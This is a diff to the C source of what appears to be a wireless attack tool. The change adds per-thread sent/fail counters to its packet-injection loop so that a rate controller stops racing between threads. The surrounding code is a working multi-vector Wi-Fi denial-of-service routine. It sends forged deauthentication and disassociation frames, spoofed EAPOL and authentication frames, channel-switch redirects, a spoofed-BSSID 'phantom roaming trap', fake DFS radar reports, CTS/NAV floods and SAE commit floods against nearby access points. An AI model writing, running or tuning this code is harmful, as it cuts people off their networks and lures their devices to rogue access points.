@@ -4078,6 +4078,8 @@ static void *stress_injector_thread(void *arg) {
 
   /* [FIX 47] PID Auto-Tuner: per-thread local state (was `static` = data race
    * on dual-radio) */
+  uint64_t local_sent = 0;
+  uint64_t local_fail = 0;
   uint64_t pid_last_sent = 0;
   uint64_t pid_last_fail = 0;
 
@@ -4129,29 +4131,29 @@ static void *stress_injector_thread(void *arg) {
             
             len = mk_deauth(tmp, bss, bss, 6, (seq++) & 0xFFF);
             if (inject_one(sock, tmp, len) > 0) {
-              atomic_fetch_add(&g_pkts_sent, 1);
+              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
               sent_for_ap++;
             } else {
-              atomic_fetch_add(&g_pkts_fail, 1);
+              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
             }
 
             
             len = mk_deauth(tmp, bss, bss, 7, (seq++) & 0xFFF);
             if (inject_one(sock, tmp, len) > 0) {
-              atomic_fetch_add(&g_pkts_sent, 1);
+              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
               sent_for_ap++;
             } else {
-              atomic_fetch_add(&g_pkts_fail, 1);
+              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
             }
 
             
             uint16_t reason = REASON_CODES[seq % N_REASONS];
             len = mk_deauth(tmp, bss, bss, reason, (seq++) & 0xFFF);
             if (inject_one(sock, tmp, len) > 0) {
-              atomic_fetch_add(&g_pkts_sent, 1);
+              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
               sent_for_ap++;
             } else {
-              atomic_fetch_add(&g_pkts_fail, 1);
+              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
             }
 
             
@@ -4160,10 +4162,10 @@ static void *stress_injector_thread(void *arg) {
             uint16_t rev_reason = REASON_CODES[seq % N_REASONS];
             len = mk_deauth_rev(tmp, bss, fake_cli, rev_reason, (seq++) & 0xFFF);
             if (inject_one(sock, tmp, len) > 0) {
-              atomic_fetch_add(&g_pkts_sent, 1);
+              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
               sent_for_ap++;
             } else {
-              atomic_fetch_add(&g_pkts_fail, 1);
+              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
             }
         }
       }
@@ -4174,29 +4176,29 @@ static void *stress_injector_thread(void *arg) {
             
             len = mk_disassoc(tmp, bss, BCAST, 6, seq++);
             if (inject_one(sock, tmp, len) > 0) {
-              atomic_fetch_add(&g_pkts_sent, 1);
+              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
               sent_for_ap++;
             } else {
-              atomic_fetch_add(&g_pkts_fail, 1);
+              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
             }
 
             
             len = mk_disassoc(tmp, bss, BCAST, 7, seq++);
             if (inject_one(sock, tmp, len) > 0) {
-              atomic_fetch_add(&g_pkts_sent, 1);
+              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
               sent_for_ap++;
             } else {
-              atomic_fetch_add(&g_pkts_fail, 1);
+              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
             }
 
             
             uint16_t dis_reason = REASON_CODES[seq % N_REASONS];
             len = mk_disassoc(tmp, bss, BCAST, dis_reason, seq++);
             if (inject_one(sock, tmp, len) > 0) {
-              atomic_fetch_add(&g_pkts_sent, 1);
+              { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
               sent_for_ap++;
             } else {
-              atomic_fetch_add(&g_pkts_fail, 1);
+              { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
             }
         }
       }
@@ -4209,10 +4211,10 @@ static void *stress_injector_thread(void *arg) {
         memcpy(tpl_eapol + OFF_A2, fake_cli, 6); 
         memcpy(tpl_eapol + OFF_A3, bss, 6);      
         if (inject_one(sock, tpl_eapol, tpl_eapol_len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
       }
 
@@ -4233,10 +4235,10 @@ static void *stress_injector_thread(void *arg) {
                               (uint8_t)redir, (uint8_t)c);
 
           if (inject_one(sock, tmp, len) > 0) {
-            atomic_fetch_add(&g_pkts_sent, 1);
+            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
           } else {
-            atomic_fetch_add(&g_pkts_fail, 1);
+            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
           }
         }
       }
@@ -4247,10 +4249,10 @@ static void *stress_injector_thread(void *arg) {
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
         len = mk_confusion_beacon(tmp, ssid, (uint8_t)snap[i].channel);
         if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
       }
 
@@ -4271,7 +4273,7 @@ static void *stress_injector_thread(void *arg) {
           len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
                                   (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
-            atomic_fetch_add(&g_pkts_sent, 1);
+            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
           }
 
@@ -4279,7 +4281,7 @@ static void *stress_injector_thread(void *arg) {
           len = mk_probe_resp_csa(tmp, BCAST, BCAST, ssid,
                                   (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
-            atomic_fetch_add(&g_pkts_sent, 1);
+            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
           }
           /* 3. [UPGRADE] Phantom Roaming Trap (Spoofed BSSID)
@@ -4290,7 +4292,7 @@ static void *stress_injector_thread(void *arg) {
           len = mk_probe_resp_csa(tmp, phantom_bss, BCAST, ssid,
                                   (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
-            atomic_fetch_add(&g_pkts_sent, 1);
+            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
           }
         }
@@ -4307,10 +4309,10 @@ static void *stress_injector_thread(void *arg) {
         uint16_t s_ctrl = htole16(((seq++) & 0xFFF) << 4);
         memcpy(tpl_auth + OFF_SEQ, &s_ctrl, 2); 
         if (inject_one(sock, tpl_auth, tpl_auth_len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
       }
 
@@ -4329,14 +4331,14 @@ static void *stress_injector_thread(void *arg) {
           
           len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
-            atomic_fetch_add(&g_pkts_sent, 1);
+            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
           }
 
           
           len = mk_csa_action(tmp, BCAST, BCAST, (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
-            atomic_fetch_add(&g_pkts_sent, 1);
+            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
           }
         }
@@ -4348,10 +4350,10 @@ static void *stress_injector_thread(void *arg) {
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
         len = mk_quiet_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel);
         if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
       }
 
@@ -4366,7 +4368,7 @@ static void *stress_injector_thread(void *arg) {
           uint16_t params1 = htole16(0x0800 | (tid << 12));
           memcpy(tmp + OFF_BODY + 2, &params1, 2); /* [FIX 47] correct offset */
           if (inject_one(sock, tmp, len) > 0) {
-            atomic_fetch_add(&g_pkts_sent, 1);
+            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
           }
 
@@ -4375,7 +4377,7 @@ static void *stress_injector_thread(void *arg) {
           uint16_t params2 = htole16(0x0000 | (tid << 12));
           memcpy(tmp + OFF_BODY + 2, &params2, 2); /* [FIX 47] correct offset */
           if (inject_one(sock, tmp, len) > 0) {
-            atomic_fetch_add(&g_pkts_sent, 1);
+            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
           }
         }
@@ -4390,16 +4392,16 @@ static void *stress_injector_thread(void *arg) {
         int len1 = mk_frag_payload(tmp1, bss, fake_cli, fseq, NULL, 0);
 
         if (inject_one(sock, tmp, len0) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
         if (inject_one(sock, tmp1, len1) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
       }
 
@@ -4415,20 +4417,20 @@ static void *stress_injector_thread(void *arg) {
           
           len = mk_dfs_radar_report(tmp, bss, fake_cli, cur, (seq + burst) & 0xFF);
           if (inject_one(sock, tmp, len) > 0) {
-            atomic_fetch_add(&g_pkts_sent, 1);
+            { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
           } else {
-            atomic_fetch_add(&g_pkts_fail, 1);
+            { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
           }
         }
 
         
         len = mk_dfs_vacate_csa(tmp, bss, ssid, cur, safe);
         if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
       }
 
@@ -4437,18 +4439,18 @@ static void *stress_injector_thread(void *arg) {
         
         len = mk_cts_nav(tmp, bss);
         if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
         
         len = mk_cts_nav(tmp, BCAST);
         if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
       }
 
@@ -4460,10 +4462,10 @@ static void *stress_injector_thread(void *arg) {
         uint16_t sae_groups[] = {19, 20, 21};
         len = mk_sae_commit(tmp, bss, fake_cli, sae_groups[seq % 3]);
         if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
       }
 
@@ -4472,10 +4474,10 @@ static void *stress_injector_thread(void *arg) {
         
         len = mk_bss_transition(tmp, bss, BCAST);
         if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
       }
 
@@ -4484,10 +4486,10 @@ static void *stress_injector_thread(void *arg) {
         
         len = mk_beacon_report_req(tmp, bss, BCAST, (uint8_t)snap[i].channel);
         if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
+          { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
         } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+          { atomic_fetch_add(&g_pkts_fail, 1); local_fail++; }
         }
       }
 
@@ -4505,8 +4507,8 @@ static void *stress_injector_thread(void *arg) {
 
     /* [FIX 47] PID Auto-Tuner for Buffer Bloat (Rate Controller) — per-thread
      * local state */
-    uint64_t curr_sent = atomic_load(&g_pkts_sent);
-    uint64_t curr_fail = atomic_load(&g_pkts_fail);
+    uint64_t curr_sent = local_sent;
+    uint64_t curr_fail = local_fail;
 
     uint64_t d_sent = curr_sent - pid_last_sent;
     uint64_t d_fail = curr_fail - pid_last_fail;
